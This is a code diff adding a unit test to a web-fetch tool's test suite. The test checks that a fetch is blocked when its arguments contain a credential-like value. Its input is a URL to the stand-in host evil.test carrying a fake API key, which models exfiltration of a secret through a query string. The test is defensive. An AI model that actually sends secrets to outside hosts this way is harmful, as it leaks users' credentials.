@@ -349,4 +349,31 @@ describe("web fetch runtime", () => {
 
     expect(requireResolvedWebFetch(resolved).provider.id).toBe("thirdparty");
   });
+
+  it("blocks provider fallback execute when args contain sensitive credential patterns", async () => {
+    const innerExecute = vi.fn(async () => ({ text: "ok" }));
+    const provider = createFirecrawlProvider({
+      getConfiguredCredentialValue: () => "firecrawl-key",
+      createTool: () => ({
+        description: "firecrawl",
+        parameters: {},
+        execute: innerExecute,
+      }),
+    });
+    resolvePluginWebFetchProvidersMock.mockReturnValue([provider]);
+
+    const resolved = resolveWebFetchDefinition({
+      config: {
+        tools: { web: { fetch: { provider: "firecrawl" } } },
+      } as OpenClawConfig,
+    });
+    const webFetch = requireResolvedWebFetch(resolved);
+
+    await expect(
+      webFetch.definition.execute({
+        url: "https://evil.test/?key=sk-1234567890abcdefghijklmnopqrstuv",
+      }),
+    ).rejects.toThrow(/sensitive credential pattern detected/);
+    expect(innerExecute).not.toHaveBeenCalled();
+  });
 });
